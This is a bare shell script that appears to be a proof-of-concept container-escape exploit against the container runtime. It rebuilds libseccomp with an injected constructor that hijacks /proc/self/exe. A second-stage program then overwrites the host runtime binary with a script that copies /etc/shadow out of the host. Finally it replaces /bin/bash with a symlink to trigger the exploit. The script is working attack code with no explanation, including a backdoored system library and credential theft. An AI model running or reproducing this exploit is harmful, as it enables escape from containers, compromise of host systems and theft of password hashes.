sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list 
apt -y update
apt-get -y install build-essential
cd /root
apt-get -y build-dep libseccomp
apt-get source libseccomp
cat >/root/stage1.c <<EOF
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

__attribute__ ((constructor)) void foo(void)
{
    int fd = open("/proc/self/exe", O_RDONLY);
    if (fd == -1 ) {
        printf("HAX: can't open /proc/self/exe\n");
        return;
    }
    printf("HAX: fd is %d\n", fd);

    char *argv2[3];
    argv2[0] = strdup("/stage2");
    char buf[128];
    snprintf(buf, 128, "/proc/self/fd/%d", fd);
    argv2[1] = buf;
    argv2[2] = 0;
    execve("/stage2", argv2, NULL);
}
EOF
cd /root/libseccomp-2.3.1
cat /root/stage1.c >> src/api.c
DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us
dpkg -i /root/*.deb
cat >/root/stage2.c <<EOF
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>


int main(int argc, char **argv) {
    printf("HAX2: argv: %s\n", argv[1]);
    FILE *fd;
    fd = fopen(argv[1], "wb");
    printf("HAX2: fd: %d\n", fd);

    const char *text = "#!/bin/bash\ncat /etc/shadow > /root/shadow.txt\ndocker cp /root/shadow.txt test:.";
    fprintf(fd, "%s\n", text);
    fclose(fd);
}

EOF
cd /root
gcc stage2.c -o /stage2
mv /bin/bash /bin/good_bash
ln -s /proc/self/exe /bin/bash
